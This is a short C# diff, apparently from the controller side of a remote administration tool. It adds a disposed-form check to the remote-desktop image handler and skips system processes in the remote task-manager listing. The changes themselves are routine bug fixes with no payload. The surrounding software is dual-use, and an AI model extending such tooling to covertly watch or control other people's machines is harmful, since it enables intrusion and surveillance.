@@ -41,7 +41,10 @@ namespace xServer.Core.Commands
         }
         public static void HandleGetDesktopResponse(Client client, GetDesktopResponse packet)
         {
-            if (client.Value == null || client.Value.FrmRdp == null)
+            if (client.Value == null 
+                || client.Value.FrmRdp == null 
+                || client.Value.FrmRdp.IsDisposed 
+                || client.Value.FrmRdp.Disposing)
                 return;
 
             if (packet.Image == null)
@@ -91,6 +94,9 @@ namespace xServer.Core.Commands
 
                 for (int i = 0; i < packet.Processes.Length; i++)
                 {
+                    if (packet.IDs[i] == 0 || packet.Processes[i] == "System.exe")
+                        continue;
+
                     if (client.Value == null || client.Value.FrmTm == null)
                         break;
                     
